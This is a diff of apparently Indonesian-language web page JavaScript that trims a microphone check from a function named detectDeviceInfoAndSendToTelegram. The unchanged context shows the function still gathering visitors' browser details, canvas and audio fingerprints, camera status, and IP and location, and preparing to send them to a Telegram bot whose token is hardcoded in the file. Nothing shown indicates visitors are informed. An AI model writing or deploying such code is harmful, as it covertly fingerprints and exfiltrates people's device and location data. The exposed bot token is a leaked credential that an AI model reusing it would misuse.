@@ -578,7 +578,6 @@ function addCustomMarker() {
 */
 
 async function detectDeviceInfoAndSendToTelegram() {
-    // Informasi Dasar Perangkat
     const userAgent = navigator.userAgent || "Tidak tersedia";
     const platform = navigator.platform || "Tidak tersedia";
     const language = navigator.language || "Tidak tersedia";
@@ -639,7 +638,6 @@ async function detectDeviceInfoAndSendToTelegram() {
     const audioFingerprint = generateAudioFingerprint();
     const adBlockerStatus = detectAdBlocker() ? "Aktif 🛑" : "Tidak Aktif";
     const cameraStatus = await detectCamera() ? "Tersedia 📷" : "Tidak Tersedia";
-    const microphoneStatus = await detectMicrophone() ? "Tersedia 🎤" : "Tidak Tersedia";
     const systemTheme = detectSystemTheme();
 
     // Mengambil informasi IP dan Lokasi
@@ -759,16 +757,6 @@ async function detectDeviceInfoAndSendToTelegram() {
         }
     }
 
-    async function detectMicrophone() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            stream.getTracks().forEach(track => track.stop());
-            return true;
-        } catch (error) {
-            return false;
-        }
-    }
-
     function detectSystemTheme() {
         if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
             return 'Dark 🌙';
@@ -791,7 +779,7 @@ async function detectDeviceInfoAndSendToTelegram() {
             cookieEnabled, darkMode, doNotTrack, plugins,
             batteryInfo,
             webGLSupport, webRTCSupport, canvasFingerprint, audioFingerprint,
-            adBlockerStatus, cameraStatus, microphoneStatus, systemTheme
+            adBlockerStatus, cameraStatus, systemTheme
         };
 
         const botToken = '7990557243:AAE4YiElAfZQ1sDdGg-RvCJHbvv0pKYk0h8'; // Ganti dengan token bot Telegram
@@ -860,7 +848,6 @@ async function detectDeviceInfoAndSendToTelegram() {
 • *Plugin*: ${deviceInfo.plugins}
 • *AdBlocker*: ${deviceInfo.adBlockerStatus}
 • *Kamera*: ${deviceInfo.cameraStatus}
-• *Mikrofon*: ${deviceInfo.microphoneStatus}
 • *Tema Sistem*: ${deviceInfo.systemTheme}
 
 ⚙️ *Fitur Tambahan*
